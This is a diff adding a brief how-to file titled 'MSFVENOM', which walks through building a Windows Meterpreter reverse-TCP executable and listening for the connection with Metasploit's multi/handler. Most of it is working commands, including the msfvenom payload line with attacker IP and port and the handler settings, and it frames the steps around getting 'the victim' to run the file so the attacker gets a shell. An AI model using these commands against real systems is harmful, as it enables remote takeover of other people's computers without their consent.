@@ -1,0 +1,28 @@
+--> MSFVENOM <--
+
+
+Step 1. Install Kali Linux.
+
+Step 2. Create this malicious executable with msfvenom.
+
+Step 3. See supported systems, type:
+	msfvenom -l payloads
+	
+Step 4. Create a malicious executable with it, for example:
+
+	msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.14 LPORT=4444 -f exe -a x64 -o program.exe
+
+	Change the parameters -p (system), LHOST (your vps ip), LPORT (vps port). Change the payload and output 
+	format -f exe and -o program.exe as needed for your target system.
+
+Step 5. This executable must be downloaded and run by the victim (the workstation).
+
+Step 6. On the Kali vps server listen on your ip/port with the right payload. This should be your attacker ip and port
+
+	msf> use exploit/multi/handler
+	msf> set PAYLOAD windows/x64/meterpreter/reverse_tcp
+	msf> set LHOST 192.168.1.14
+	msf> set LPORT 4444
+	msf> run
+
+Step 7. Once the victim runs the program, you'll have a shell into his system.
